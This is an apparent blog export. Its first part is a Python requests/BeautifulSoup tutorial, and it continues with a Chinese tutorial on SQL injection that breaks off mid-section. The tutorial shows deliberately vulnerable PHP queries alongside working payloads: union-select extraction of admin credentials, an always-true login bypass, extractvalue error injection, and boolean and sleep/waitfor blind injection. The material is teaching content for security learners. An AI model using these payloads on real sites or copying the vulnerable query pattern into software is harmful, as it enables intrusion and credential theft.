title="requests库概述"></a>requests库概述</h3><p>（1）requests库最大的优点：程序编写过程更接近正常URL访问过程。</p><p>（2）这个库建立在Python语言的urllib3库的基础上，类似这种在其他函数库之上再封装功能、提供更友好函数的方式在Python语言中十分常见。</p><p>（3）requests库支持非常丰富的链接访问功能，包括国际域名和URL获取、HTTP长连接和连接缓存、HTTP会话和Cookie保持、浏览器使用风格的SSL验证、基本的摘要认证、有效的键值对Cookie记录、自动解压缩、自动内容解码、文件分块上传、HTTP(S)代理功能、连接超时处理、数据下载等。更多介绍访问<a href="http://docs.python-requests.org/">http://docs.python-requests.org</a></p><h3 id="requests库解析"><a href="#requests库解析" class="headerlink" title="requests库解析"></a>requests库解析</h3><p>（1）网络爬虫和信息提交只是requests库能支持的基本功能，其中，与网页请求相关的函数如下表所示</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">get(url[,timeout=n])</td><td align="center">对应于HTTP的GET方式，获取网页最常用的方法，可以增加timeout=n参数，设定每次请求超时时间为n秒</td></tr><tr><td align="center">post(url,data={‘key’:’value’})</td><td align="center">对应于HTTP的POST方式，其中字典用于传递客户数据</td></tr><tr><td align="center">delete(url)</td><td align="center">对应于HTTP的DELETE方式</td></tr><tr><td align="center">head(url)</td><td align="center">对应于HTTP的HEAD方式</td></tr><tr><td align="center">options(url)</td><td align="center">对应于HTTP的OPTIONS方式</td></tr><tr><td align="center">put(url,data={‘key’:’value’})</td><td align="center">对应于HTTP的PUT方式，其中字典用于传递客户数据</td></tr></tbody></table><p>（2）get()是获取网页最常用的方式，在调用requests.get()函数后，返回的网页内容会保存为一个Response对象，其中，get()函数的参数url链接必须采用HTTP或HTTPS方式访问，例如：</p><pre><code class="python">&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get(&quot;http://www.baidu.com&quot;)    #使用get方法打开百度链接&gt;&gt;&gt; type(r)&lt;class &#39;requests.models.Response&#39;&gt;              #返回Response对象</code></pre><p>（3）和浏览器的交互过程一样，requests.get()代表请求过程，它返回的Response对象代表响应。返回内容作为一个对象更便于操作，Response对象的属性如下表所示，<strong>需要采用&lt;a&gt;.&lt;b&gt;形式</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">status_code</td><td align="center">HTTP请求的返回状态，整数，200表示连接成功，404表示连接失败</td></tr><tr><td align="center">text</td><td align="center">HTTP响应内容的字符串形式，即url对应的页面内容</td></tr><tr><td align="center">encoding</td><td align="center">HTTP响应内容的编码方式</td></tr><tr><td align="center">content</td><td align="center">HTTP响应内容的二进制形式</td></tr></tbody></table><ul><li>status_code属性返回请求HTTP后的状态，<strong>在处理数据之前要先判断状态情况，若请求未被响应，需要终止内容处理。</strong></li><li>text属性是情趣的页面内容，以字符串形式展示。</li><li>encoding给出了返回页面内容的编码方式，可以通过对encoding属性赋值更改编码方式，以便于处理中文字符。</li></ul><pre><code class="python">&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get(&quot;http://www.baidu.com&quot;)&gt;&gt;&gt; r.status_code   #返回状态200&gt;&gt;&gt; r.text         #返回观察内容，中文字符是否能正常显示(输出略)中文乱码&gt;&gt;&gt; r.encoding     #默认的编码方式是ISO-8859-1，所以中文是乱码&#39;ISO-8859-1&#39;&gt;&gt;&gt; r.encoding = &#39;utf-8&#39;&gt;&gt;&gt; r.text        #更改完成，返回内容中的中文字符可以正常显示(输出略)</code></pre><p>（4）除了属性，Response对象还提供一些方法，如下表所示</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">json()</td><td align="center">如果HTTP响应内容包含JSON格式数据，则该方法解析存在的JSON数据</td></tr><tr><td align="center">raise_for_status()</td><td align="center">如果返回的请求状态不是200，则产生异常，用于try-except语句</td></tr></tbody></table><p>（5）使用异常处理语句可以避免设置一堆复杂的if语句，只需要在收到响应时调用raise_for_status()这个方法，就可以避开状态字200以外的各种意外情况。</p><p>（6）requests会产生几种常用异常。</p><ul><li>当遇到网络问题，如DNS查询失败、拒绝连接等，requests会抛出ConnectionError异常；</li><li>遇到无效HTTP响应时，requests则会抛出HTTPError异常；</li><li>若请求url超时，则抛出Timeout异常；</li><li>若请求超过了设定的最大重定向次数，则会抛出一个TooManyRedirects异常。</li></ul><p>（7）获取一个网页内容的函数建议采用如下代码的第2到第9行，第10到第11行是测试代码。</p><pre><code class="python">import requestsdef getHTMLText(url):    try:        r = requests.get(url,timeout=30)        r.raise_for_status()      #如果状态不是200，引发异常        r.encoding=&#39;utf-8&#39;        #无论原来用什么编码，都改成utf-8        return r.text    except:        return &quot;&quot;url = &quot;http://www.baidu.com&quot;print(getHTMLText(url))</code></pre><h3 id="扩展：HTTP的GET和POST"><a href="#扩展：HTTP的GET和POST" class="headerlink" title="扩展：HTTP的GET和POST"></a>扩展：HTTP的GET和POST</h3><p>HTTP协议定义了客户端与服务器交互的不同方法，最基本的方法是GET和POST。二者区别如下：</p><ul><li>GET方式可以通过URL提交数据，待提交数据是URL的一部分；采用POST方式，待提交数据放置在HTML HEADER内。</li><li>GET方式提交的数据最多不超过1024字节，POST没有对提交内容的长度限制。</li><li>安全性问题。使用GET时参数会显示在URL中，而POST不会。若提交数据是敏感数据，一般采用POST方式。</li></ul><h2 id="beautifulsoup4库的使用"><a href="#beautifulsoup4库的使用" class="headerlink" title="beautifulsoup4库的使用"></a>beautifulsoup4库的使用</h2><p>要点：beautifulsoup4库是一个<strong>解析和处理HTML和XML</strong>的第三方库</p><h3 id="beautifulsoup4库概述"><a href="#beautifulsoup4库概述" class="headerlink" title="beautifulsoup4库概述"></a>beautifulsoup4库概述</h3><p>（1）使用requests库获取HTML页面并将其转换成字符串后，需要进一步解析HTML页面格式，提取有用信息，这需要处理HTML和XML的函数库。</p><p>（2）beautifulsoup4库，也被称为Beautiful Soup库或bs4库，最大的优点是能根据HTML和XML语法建立解析树，进而高效解析其中内容。</p><p>（3）HTML建立的web页面一般很复杂，除了有用的内容信息外，还包括大量用于页面格式的元素。beautifulsoup4库将专业的web页面格式解析部分封装成函数，提供了若干有用且便捷的处理函数。</p><p>（4）beautifulsoup4库采用面向对象思想实现，即它把每个页面当做一个对象，通过&lt;a&gt;.&lt;b&gt;的方式调用对象属性(即包含的内容)，或者通过&lt;a&gt;.&lt;b&gt;()的方式调用方法(即处理函数)。</p><p>（5）由于beautifulsoup4库名字的特殊性和采用面向对象方式组织，可以用from-import方式从库中直接引用BeautifulSoup类。该库主页：<a href="http://www.crummy.com/software/BeautifulSoup/bs4/">http://www.crummy.com/software/BeautifulSoup/bs4/</a></p><pre><code class="python">from bs4 import BeautifulSoup</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入原理与实践进阶</title>
      <link href="2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/"/>
      <url>2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，<strong>SQL注入攻击</strong>指的是通过<strong>构建特殊的输入作为参数传入Web应用程序，</strong>改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序<strong>没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</strong></p><h3 id="从程序编写的角度看SQL注入"><a href="#从程序编写的角度看SQL注入" class="headerlink" title="从程序编写的角度看SQL注入"></a>从程序编写的角度看SQL注入</h3><p>SQL注入漏洞产生的本质原因是<strong>将获取到的用户可控数据在没有经过安全处理的情况下拼接到SQL语句中并发送给数据库服务器执行导致的。</strong></p><pre><code class="php">&lt;?php$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,sqleasy);$newsid=$_GET[&#39;newsid&#39;];   //用户可控输入(GET情趣的newsid参数)//拼接到了发送数据库服务器执行的SQL语句中$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);$row = mysqli_fetch_array($result);echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;;?&gt;</code></pre><h3 id="SQL注入的常见场景"><a href="#SQL注入的常见场景" class="headerlink" title="SQL注入的常见场景"></a>SQL注入的常见场景</h3><h4 id="数据查询功能"><a href="#数据查询功能" class="headerlink" title="数据查询功能"></a>数据查询功能</h4><p>数据查询功能是WEB应用最常见的功能之一，实现方式就是<strong>根据用户提交的查询条件将数据库中的信息查询出来并显示在页面上，此时用户提交的数据通常被拼接到SQL语句的查询条件位置（即where之后）</strong>，这种情况下如果没有进行安全处理，使用<strong>联合查询注入</strong>的方式可以很方便的获取数据库的敏感信息。</p><ul><li>程序员思维</li></ul><pre><code class="php">//获取用户的查询条件：$newsid=$_GET[&#39;newsid&#39;];//构造SQL语句查询相关信息$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=$newsid&quot;);//将结果显示在页面上：$row = mysqli_fetch_array($result);echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;</code></pre><ul><li>黑客思维</li></ul><pre><code class="sql">联合查询注入http://127.0.0.1/sqleasy_webjj/news.php?newsid=0 union select username,password from admin;实际执行语句SELECT title,context FROM `news` WHERE newsid=0 union select username,password from admin;</code></pre><h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>登录功能也是WEB应用的常见功能之一，通常的实现方式就是<strong>将用户输入的用户名和密码在数据库中查询，如果有匹配的结果说明用户名密码正确，即判断为登录成功，否则就登录失败。</strong>这个过程中用户输入的用户名和密码通常也会被拼接到SQL语句的查询条件位置（即where之后），这种情况下如果没有进行安全处理，<strong>攻击者可以插入恶意的SQL语句改变判断条件的结果，达到登录任意账号的目的（即通常说的万能密码攻击）。</strong></p><ul><li>程序员思维</li></ul><pre><code class="php">//获取用户输入的用户名和密码：$name=$_POST[&#39;username&#39;]; $pwd=$_POST[&#39;password&#39;];//构造SQL语句查询admin表中是否有匹配的信息$result = mysqli_query($con,&quot;select * from admin where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;);//根据结果集是否为空判断账号密码是否存在$res=mysql_fetch_array($result); if(is_array($res))&#123;$login=true;    &#125;else&#123;    $login=false; &#125;</code></pre><ul><li>黑客思维</li></ul><p><img src="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png" alt="image-20210423162120756"></p><pre><code class="sql">实际执行语句select * from admin where username=&#39;jiaoshou&#39;or&#39;1&#39; and password=&#39;adjflajsdlfl&#39;</code></pre><h4 id="程序将错误信息直接返回页面"><a href="#程序将错误信息直接返回页面" class="headerlink" title="程序将错误信息直接返回页面"></a>程序将错误信息直接返回页面</h4><p>为了方便程序调试，许多程序员会<strong>将SQL查询的报错信息直接回显到页面上。</strong>这种情况下黑客可以<strong>利用特殊的<br>函数或者语法构造错误的SQL语句，使得敏感数据通过报错信息直接回显到页面上。</strong>对于<strong>在线的WEB系统</strong>而言，<br>程序的<strong>错误信息应该记录到日志中</strong>，而不是显示在页面上。</p><ul><li>程序员思维</li></ul><pre><code class="php">//在SQL语句执行后打印报错信息，方便调试$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);if(!empty(mysqli_error($con)))&#123;     echo mysqli_error($con);&#125;//mysqli_error() 函数返回最近调用函数的最后一个错误描述。//empty($var) empty()用来检查变量var是否为空，若var为空则返回true，当var存在且是一个非空非零的值时返回false。</code></pre><ul><li>黑客思维</li></ul><p><img src="https://i.loli.net/2021/04/23/wiyFLTR1EuBmsJg.png" alt="image-20210423171401714"></p><pre><code class="sql">实际执行语句：SELECT title,context FROM `news` WHERE newsid= 11 and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></pre><h4 id="基于查询条件返回判断结果"><a href="#基于查询条件返回判断结果" class="headerlink" title="基于查询条件返回判断结果"></a>基于查询条件返回判断结果</h4><p>有时候某些功能是<strong>根据用户输入的查询条件，去数据库中查询相关数据，但不会返回查询结果，而是根据查询<br>结果的情况返回某些信息。</strong>例如，根据学生学号查询成绩，根据查询到的分数返回是否及格（而不是具体分数）。<br>由于数据库中的信息不会直接返回到页面，<strong>无法使用联合查询注入</strong>，如果程序员<strong>也没有输出报错信息到页面上</strong>，那<br>么我们是无法直接通过SQL注入获取数据的。此时，<strong>可以采用盲注的方式来尝试获取数据。</strong></p><ul><li>程序员思维</li></ul><pre><code class="php">//获取用户输入的学生id$id = $_GET[&#39;id&#39;];//构造SQL语句查询info表中是否有匹配的信息$result = mysqli_query($con, &quot;SELECT score FROM `info` WHERE id=&#39;$id&#39;&quot;);$row = mysqli_fetch_array($result);//判断结果是否为空    if (is_array($row)) &#123;     //is_array用于检测变量是否为一个数组//判断成绩是否及格        if ($row[&#39;score&#39;] &gt;= 60) &#123;            echo &quot;$id 号同学，恭喜你，成绩及格了&quot;;        &#125; else &#123;echo &quot;$id 号同学，很遗憾，你没有及格&quot;;&#125;    &#125; else &#123;echo &quot;对不起，你输入的学号不存在&quot;;&#125;&#125;</code></pre><ul><li>黑客思维</li></ul><p><img src="https://i.loli.net/2021/04/23/4r2Vj7gG9L6NuQT.png" alt="image-20210423171310802"></p><pre><code class="sql">--substr(string,1,1) 返回字符串的一部分。例如下方代码，返回从第1个到第1个字符-- 实际执行语句：SELECT score FROM `info` WHERE id=1024 and substr(database(),1,1)=&#39;s&#39;</code></pre><h4 id="数据的插入、修改与删除功能"><a href="#数据的插入、修改与删除功能" class="headerlink" title="数据的插入、修改与删除功能"></a>数据的插入、修改与删除功能</h4><p>除了查询相关的功能以外，对数据库的数据进行数据插入、修改、删除操作也是常见的功能（insert、update<br>、delete），这些功能与查询语句不同的是并不会返回结果集数据（只会返回成功失败的状态码），如果又没有输<br>出报错信息，即使用户输入的数据没有进行安全处理，也难以使用联合查询、报错注入、布尔型盲注等方式注入，<br>这时，<strong>可以采用时间型盲注进行注入。</strong></p><ul><li>程序员思维</li></ul><pre><code class="php">//获取用户输入的信息$username = $_POST[&#39;username&#39;];$passwd = $_POST[&#39;passwd1&#39;];$question = $_POST[&#39;question&#39;];$answer = $_POST[&#39;answer&#39;];//构造SQL语句将用户输入的信息插入数据库$query = &quot;INSERT INTO admin(role,username,password,question,answer) VALUES (&#39;student&#39;,&#39;$username&#39;,&#39;$passwd&#39;,&#39;$question&#39;,&#39;$answer&#39;)&quot;;mysql_query($query) or die(&quot;Error!!&quot;);</code></pre><ul><li>黑客思维</li></ul><p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20210423172110563.png" alt="image-20210423172110563"></p><pre><code class="sql">--实际执行语句：INSERT INTO admin(role,username,password,question,answer) VALUES (&#39;student&#39;,&#39;test2&#39;,&#39;test2&#39;,&#39;&#39;,if(left(database(),1)=&#39;s&#39;,sleep(3),0))#&#39;,&#39;ndsec&#39;)</code></pre><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table><thead><tr><th align="center">基于注入点位置分类</th><th align="center">基于变量数据类型分类</th><th align="center">基于获取数据的方法分类</th></tr></thead><tbody><tr><td align="center">GET注入、POST注入、Cookie注入</td><td align="center">字符型注入、数字型注入</td><td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td></tr></tbody></table><h2 id="SQL注入点的查找与判断"><a href="#SQL注入点的查找与判断" class="headerlink" title="SQL注入点的查找与判断"></a>SQL注入点的查找与判断</h2><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>SQL注入漏洞的测试主要包括<strong>寻找可能的注入点</strong>以及<strong>针对可能的注入点进行测试</strong>两个环节，核心思路和流程如下：</p><p><img src="https://i.loli.net/2021/04/23/qFYGkpnrQszyJUK.png" alt="image-20210423172821267"></p><h3 id="寻找可能的注入点"><a href="#寻找可能的注入点" class="headerlink" title="寻找可能的注入点"></a>寻找可能的注入点</h3><h4 id="服务器能取到的用户输入"><a href="#服务器能取到的用户输入" class="headerlink" title="服务器能取到的用户输入"></a>服务器能取到的用户输入</h4><p>（1）<strong>任何服务器能取到的用户输入，都是可能存在SQL注入的注入点，</strong>对于手工测试而言，通常根据业务找寻可能与数据库有交互的输入作为潜在的注入点进行测试。</p><p>（2）常见注入点：</p><ul><li>表单提交，主要是POST请求，也包括GET请求。</li><li>URL参数提交，主要为GET请求参数。</li><li>Cookie参数提交。</li><li>HTTP请求头部可修改的值，比如：Referer、User_Agent等。</li><li>边缘的输入点，比如.mp3文件的一些文件信息等。</li></ul><p><strong>PS：以PHP为例，通过各类超全局变量可以取到各类用户输入，这些都是潜在的注入点</strong></p><h4 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h4><ul><li>GET请求和POST请求的参数值是最常见的注入点，是测试时需要重点关注的地方。</li><li>除了标准的请求参数值，采用一些特殊数据传输格式的参数值也有可能存在注入点，如JSON或XML格式传输的参<br>数值。</li></ul><p><img src="https://i.loli.net/2021/04/23/ESf3YZi76wldJCF.png" alt="image-20210423181050875"></p><p><img src="https://i.loli.net/2021/04/23/nlqosbjvWRXBi59.png" alt="image-20210423181119960"></p><ul><li>Cookie中的一些字段有时也会用于数据库查询或其他操作，往往也是需要关注的潜在注入点。</li></ul><p><img src="https://i.loli.net/2021/04/23/6OvbCryUKpWoDMh.png" alt="image-20210423181155681"></p><ul><li>HTTP请求头部的其他字段也可能存在注入点，如refer字段有时会被写入数据库。</li></ul><p><img src="https://i.loli.net/2021/04/23/A8XJ4hVqDHrg3sc.png" alt="image-20210423181231673"></p><h3 id="SQL注入点的测试"><a href="#SQL注入点的测试" class="headerlink" title="SQL注入点的测试"></a>SQL注入点的测试</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>SQL注入点的测试本质上是基于原理的模糊测试，我们需要根据一个注入点的功能，推测其可能使用的SQL操作、用户输入的数据类型（数字型或字符型）以及用户输入拼接到SQL语句的位置，并尝试构造基础的报错注入语句、布尔盲注或时间盲注语句来验证相关位置是否存在sql注入漏洞。</p><p><strong>注意：在未知源码的情况下，我们只能尽可能尝试构造各类测试语句来对注入点进行测试，如果测试现象符合条件可以认为存在SQL注入漏洞，但测试现象不符合预期并不能100%确定SQL注入漏洞不存在。</strong></p><p><img src="https://i.loli.net/2021/04/23/htUOibI7gH4QRcA.png" alt="image-20210423184225134"></p><h4 id="构造报错注入语句"><a href="#构造报错注入语句" class="headerlink" title="构造报错注入语句"></a>构造报错注入语句</h4><p>在进行SQL注入点测试的时候，<strong>构造报错注入语句是第一步，</strong>报错注入语句的构造相对简单，通常<strong>只要在参数值中增加一些常见的符号就可以让SQL语句产生语法错误</strong>，常见可使用的符号包括单引号、双引号、括号、分号、冒号、斜杠、反斜杠等，可以将这些符号<strong>组合使用</strong>进行尝试。</p><p><img src="https://i.loli.net/2021/04/23/VW2uQz5rx4UHpiv.png" alt="image-20210423184705988"></p><h4 id="报错注入结果判断"><a href="#报错注入结果判断" class="headerlink" title="报错注入结果判断"></a>报错注入结果判断</h4><p>（1）<strong>出现数据库原始报错信息，可以确定存在SQL注入漏洞.</strong></p><p><img src="https://i.loli.net/2021/04/23/WrFHQOf7xXAzcVZ.png" alt="image-20210423184915060"></p><p><img src="https://i.loli.net/2021/04/23/YqhPbHlTLux1oE3.png" alt="image-20210423184815009"></p><p>（2）在输入某些测试payload时导致页面显示异常，包括结果显示异常或出现通用报错信息，都有可能是SQL注入漏洞但也有可能是系统正常的错误处理机制导致的，需要进一步测试。对于没有回显的语句（如插入、修改功能），可以<strong>根据操作结果返回包的状态码、包长度等信息推测SQL语句是否出错。</strong></p><h4 id="布尔型盲注语句的构造"><a href="#布尔型盲注语句的构造" class="headerlink" title="布尔型盲注语句的构造"></a>布尔型盲注语句的构造</h4><p>（1）布尔型盲注语句需要在涉及判断的功能中才能使用，其中最常见的就是在查询条件的位置，分别拼接上一段结果为真和结果为假的判断语句，如果<strong>结果为真时显示效果与原来一致，结果为假时查询不到数据或与原来数据不一致，则认为存在布尔型盲注。</strong></p><p>（2）布尔型盲注的本质就是构造两个分别为真和假的表达式，只要符按照这个思路，可以任意进行构造。</p><p><img src="https://i.loli.net/2021/04/23/lBdabnu4yxCEhwV.png" alt="image-20210423185446985"></p><p><img src="https://i.loli.net/2021/04/23/TCYSLltKdFQJ1nu.png" alt="image-20210423185511489"></p><h4 id="时间型盲注语句构造"><a href="#时间型盲注语句构造" class="headerlink" title="时间型盲注语句构造"></a>时间型盲注语句构造</h4><p>（1）对于没有涉及判断的功能，如插入、更新等语句的数据位置（而非条件语句的位置），或者布尔型盲注的结果无法判断的（如显示均正常或均异常），可以尝试使用时间型盲注语句进行测试，<strong>如果插入时间型盲注语句后服务器延时响应，则认为存在SQL注入漏洞。</strong></p><p>（2）与其他测试方式不同的是，时间型盲注依赖于时间相关函数或语法，每个数据库的函数并不相同只能进行尝试。<br>在实际使用中，通常有直接调用延时函数（或语法）和调用耗时较高的函数（或语法）两种方式：</p><table><thead><tr><th align="center">直接调用延时函数（或语法）</th><th align="center">调用耗时较高的函数（或语法）</th></tr></thead><tbody><tr><td align="center">MySQL和SQLserver提供了可直接调用的延时函数和语法，如MySQL的sleep()函数和SQLserver的waitfor()语法可直接调用</td><td align="center">针对其他数据库或延时函数(语法)不适用时可以尝试调用耗时较高的函数或语法。如：select BENCHMARK(10000000,MD5(‘a’));</td></tr></tbody></table><p>（3）Mysql：SLEEP函数可以实现延迟，在所有数据位置均可以使用:</p><pre><code>对于数字型SQL注入，通常直接拼接判断语句即可SELECT title,context FROM `news` WHERE newsid= 11 and sleep(10)对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接SELECT score FROM `info` WHERE name=&#39;lilei&#39;and sleep(10) and &#39;1&#39;</code></pre><p>（4）SQLserver：WAITFOR DELAY 语句可以实现，通常需要跟在条件判断语句之后:</p><pre><code>对于数字型SQL注入，通常直接拼接判断语句即可SELECT title,context FROM `news` WHERE newsid= 11 waitfor delay &#39;0:0:4&#39;对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接SELECT score FROM `info` WHERE name=&#39;lilei&#39; waitfor delay &#39;0:0:4’</code></pre><h4 id="时间型盲注的结果判断"><a href="#时间型盲注的结果判断" class="headerlink" title="时间型盲注的结果判断"></a>时间型盲注的结果判断</h4><p>时间型盲注的结果判断主要是根据服务器的响应结果，如果在<strong>加入时间型盲注语句后服务器响应有明显的延时，可以判断SQL注入漏洞存在。</strong>为了排除网络环境影响，可以尝试不同延时量的时间型盲注语句，根据延时的差异进一步进行确认。使用Firefox的firebug插件可以准确的跟踪延时信息。</p><h2 id="SQL注入漏洞的利用"><a href="#SQL注入漏洞的利用" class="headerlink" title="SQL注入漏洞的利用"></a>SQL注入漏洞的利用</h2><h3 id="SQL注入的核心利用目标"><a href="#SQL注入的核心利用目标" class="headerlink" title="SQL注入的核心利用目标"></a>SQL注入的核心利用目标</h3><p>（1）SQL注入的核心利用目标主要包括以下三类：</p><ul><li>操作数据</li></ul><pre><code>•查询数据是SQL注入最常见的一种利用方式，网站数据库中通常存储着大量有价值的数据，通过批量查询数据的方式可以获取这些数据，也就是人们常说的“拖库”。•数据库中通常还存储着WEB应用的管理后台账号密码，通过获取管理后台账号密码可以更加方便的提取数据、进行更多操作或为进一步攻击提供便利，因此网站管理后台账号密码往往是数据查询的第一目标•除了查询以外，也可以对数据进行增删改操作，达到更多的非法目的</code></pre><ul><li>读写文件</li></ul><pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句读写文件来进行进一步攻击以获取更多的权限，如读取网站配置文件、修改注册表文件、上传木马等。</code></pre><ul><li>执行命令</li></ul><pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句执行操作系统命令来进行进一步攻击获取更多的权限，如开放远程连接服务、创建系统用户、配合文件读写功能完成反弹shell等。</code></pre><h3 id="SQL注入利用的基本流程"><a href="#SQL注入利用的基本流程" class="headerlink" title="SQL注入利用的基本流程"></a>SQL注入利用的基本流程</h3><p>（1）注入点分析</p><ul><li>注入点位置</li><li>数字型/字符型</li><li>可利用的注入方式（联合查询、报错注入、盲注等）</li></ul><p>（2）判断数据库类型</p><ul><li>MySQL</li><li>SQLserver</li><li>Oracle</li><li>PostgreSQL</li></ul><p>（3）选择漏洞利用目标</p><ul><li>操作数据</li><li>读写文件</li><li>执行命令</li></ul><p>（4）构造漏洞利用语句</p><ul><li>基础利用语句</li><li>绕过过滤</li></ul><h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><p>（1）基于WEB开发语言（推测）</p><ul><li>Asp、aspx通常与access、sqlserver一起使用</li><li>Php通常与mysql、PostgreSQL一起使用</li><li>Jsp通常与oracle和mysql一起使用</li></ul><p>（2）基于报错信息：数据库报错信息通常会暴露数据库类型，可以帮助我们有效判断数据库类型</p><p>（3）基于数据库特性：某些函数、内置表或语法为某些数据库特有，利用这些特性构造相关语句可以<br>帮助我们判断出数据库类型。</p><h4 id="基于报错信息判断"><a href="#基于报错信息判断" class="headerlink" title="基于报错信息判断"></a>基于报错信息判断</h4><p>（1）MySQL：MySQL server字样</p><p><img src="https://i.loli.net/2021/04/24/ocZSYJDwniUq43T.png" alt="image-20210424092955963"></p><p>（2）Oracle：ORA-XXXX字样</p><p><img src="https://i.loli.net/2021/04/24/XtGoqIR2vQkrgmw.png" alt="image-20210424093056008"></p><p>（3）SQLite</p><p><img src="https://i.loli.net/2021/04/24/mOEqc8KFakntS1u.png" alt="image-20210424093122849"></p><h4 id="基于数据库特性判断"><a href="#基于数据库特性判断" class="headerlink" title="基于数据库特性判断"></a>基于数据库特性判断</h4><p>（1）ACCESS</p><pre><code>and (select count (*) from sysobjects)&gt;0返回异常and (select count (*) from msysobjects)&gt;0返回异常</code></pre><p>（2）SQLSERVER</p><pre><code>and (select count (*) from sysobjects)&gt;0 返回正常and (select count (*) from msysobjects)&gt;0返回异常</code></pre><p>（3）MySQL</p><pre><code>id=2 and version()&gt;0 返回正常id=2 and length(user())&gt;0返回正常id=2 CHAR(97, 110, 100, 32, 49, 61, 49)返回正常</code></pre><p>（4）Oracle</p><pre><code>and length (select user from dual)&gt;0 返回正常</code></pre><h2 id="SQL注入利用-操作数据-数据查询"><a href="#SQL注入利用-操作数据-数据查询" class="headerlink" title="SQL注入利用-操作数据-数据查询"></a>SQL注入利用-操作数据-数据查询</h2><p>操作数据是SQL注入漏洞最常见的利用方式，其中利用SQL注入查询敏感数据又是操作数据最常见的利用方法，具体流程如下：</p><p>（1）掌握基础知识</p><ul><li>关键表</li><li>关键内置函数</li><li>其他特性</li><li>编码技巧</li></ul><p>（2）选择提取方式</p><ul><li>联合查询</li><li>报错注入</li><li>布尔盲注</li><li>时间盲注</li></ul><p>（3）构造原始语句</p><ul><li>获取数据库名</li><li>获取关键表</li><li>获取关键字段</li><li>获取目标数据</li></ul><p>（4）绕过防护策略</p><ul><li>大小写</li><li>回车换行</li><li>截断</li><li>特殊字符</li><li>特殊函数</li></ul><h3 id="数据提取方式"><a href="#数据提取方式" class="headerlink" title="数据提取方式"></a>数据提取方式</h3><p>（1）联合查询</p><ul><li>构造联合查询语句，将目标数据直接查询出来并显示在页面上</li><li>目标数据直接在页面显示内容中提取</li></ul><p>（2）报错注入</p><ul><li>构造错误的SQL语句，并将目标数据在报错信息中直接显示</li><li>必须在网站回显原始报错数据的情况下使用</li><li>目标数据在报错信息中提取</li></ul><p>（3）布尔型盲注</p><ul><li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面回显内容不同</li><li>根据页面显示结果推断目标数据内容</li></ul><p>（4）时间盲注</p><ul><li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面响应时间不同</li><li>根据页面响应时间推断目标数据内容</li></ul><h3 id="数据查询语句构造"><a href="#数据查询语句构造" class="headerlink" title="数据查询语句构造"></a>数据查询语句构造</h3><h4 id="构造原始语句"><a href="#构造原始语句" class="headerlink" title="构造原始语句"></a>构造原始语句</h4><p>查询当前数据库–&gt;查询关键表–&gt;查询关键字段–&gt;提取目标数据</p><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同<br>数量的列。</strong>列也必须拥有<strong>相似的数据类型（MySQL为弱类型数据库，可不需要相似数据类型）。</strong>当UNION之前的select语句结果集为空时，查询结果将由UNION后的SELECT语句控制。</p><p><img src="https://i.loli.net/2021/04/25/quXcnafewH7YOUo.png" alt="image-20210425194312073"></p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="https://i.loli.net/2021/04/25/w1aF8Kxtq5CLrdG.png" 